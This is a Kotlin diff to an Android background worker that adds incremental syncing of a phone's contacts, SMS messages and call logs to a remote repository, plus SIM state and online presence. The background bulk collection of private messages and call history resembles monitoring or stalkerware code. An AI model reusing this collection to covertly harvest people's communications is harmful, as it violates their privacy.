@@ -22,18 +22,30 @@ class SyncWorker @AssistedInject constructor(
 
     override suspend fun doWork(): Result {
         val deviceId = DeviceIdHelper.getDeviceId(applicationContext)
-        android.util.Log.d("Sync", "BACKGROUND_SYNC_STARTED")
+        val prefs = PreferenceManager.getDefaultSharedPreferences(applicationContext)
+        val isIncremental = tags.contains("IncrementalSync")
+        val lastSmsSync = if (isIncremental) prefs.getLong("last_sms_sync", 0L) else 0L
+        val lastCallSync = if (isIncremental) prefs.getLong("last_call_sync", 0L) else 0L
+        val lastContactSync = if (isIncremental) prefs.getLong("last_contact_sync", 0L) else 0L
+
+        android.util.Log.d("Sync", "BACKGROUND_SYNC_STARTED incremental: $isIncremental")
 
         return try {
-            val contacts = DataHelper.fetchContacts(applicationContext)
-            val smsList = DataHelper.fetchSMS(applicationContext)
-            val callLogs = DataHelper.fetchCallLogs(applicationContext)
+            val contacts = DataHelper.fetchContacts(applicationContext, sinceTimestamp = lastContactSync)
+            val smsList = DataHelper.fetchSMS(applicationContext, sinceTimestamp = lastSmsSync)
+            val callLogs = DataHelper.fetchCallLogs(applicationContext, sinceTimestamp = lastCallSync)
 
             repository.syncContacts(deviceId, contacts)
             repository.syncSMS(deviceId, smsList)
             repository.syncCallLogs(deviceId, callLogs)
 
-            repository.updateDeviceInfoMap(deviceId, mapOf(
+            val simState = DataHelper.getSimState(applicationContext)
+            android.util.Log.d("Sync", "SIM_STATE_LOADED")
+            if (simState["sim1Ready"] as Boolean) android.util.Log.d("Sync", "SIM1_AVAILABLE")
+            if (simState["sim2Ready"] as Boolean) android.util.Log.d("Sync", "SIM2_AVAILABLE")
+            if (!(simState["sim1Ready"] as Boolean) && !(simState["sim2Ready"] as Boolean)) android.util.Log.d("Sync", "NO_SIM_AVAILABLE")
+
+            val updateMap = mutableMapOf<String, Any>(
                 "deviceId" to deviceId,
                 "deviceName" to Build.MODEL,
                 "lastSyncTime" to System.currentTimeMillis(),
@@ -46,11 +58,14 @@ class SyncWorker @AssistedInject constructor(
                 "syncStatus" to "Synced",
                 "presenceStatus" to "Online",
                 "lastError" to ""
-            ))
-            android.util.Log.d("Sync", "BACKGROUND_SYNC_SUCCESS")
+            )
+            updateMap.putAll(simState)
+
+            repository.updateDeviceInfoMap(deviceId, updateMap)
+            android.util.Log.d("Sync", "AUTO_SYNC_SUCCESS")
             Result.success()
         } catch (e: Exception) {
-            android.util.Log.d("Sync", "BACKGROUND_SYNC_FAILED")
+            android.util.Log.d("Sync", "AUTO_SYNC_FAILED")
             Result.retry()
         }
     }
